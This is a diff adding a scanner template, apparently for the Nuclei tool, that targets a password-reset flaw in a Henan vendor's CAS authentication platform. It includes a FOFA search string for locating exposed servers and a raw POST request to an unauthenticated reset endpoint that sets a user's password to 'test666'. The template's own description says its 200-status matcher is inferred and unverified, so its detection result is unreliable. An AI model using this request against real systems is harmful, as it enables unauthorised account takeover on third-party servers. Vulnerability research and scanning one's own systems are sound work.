@@ -1,0 +1,38 @@
+id: poc-fs7soula6gqzrdvz
+info:
+  name: 河南省风速科技统一认证平台存在密码重置漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fs7soula6gqzrdvz
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: other,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: fs7soula6gqzrdvz
+    fofa: + fofa`body="/cas/themes/zbvc/js/jquery.min.js"`
+http:
+- raw:
+  - 'POST /cas/userCtl/resetPasswordBySuper HTTP/1.1
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
+
+    Content-Type: application/json;charset=UTF-8
+
+    X-Requested-With: XMLHttpRequest
+
+    Host: {{Hostname}}
+
+    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+
+    Content-Length: 45
+
+    Connection: close
+
+
+    {"xgh":"test","newPass":"test666","email":""}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
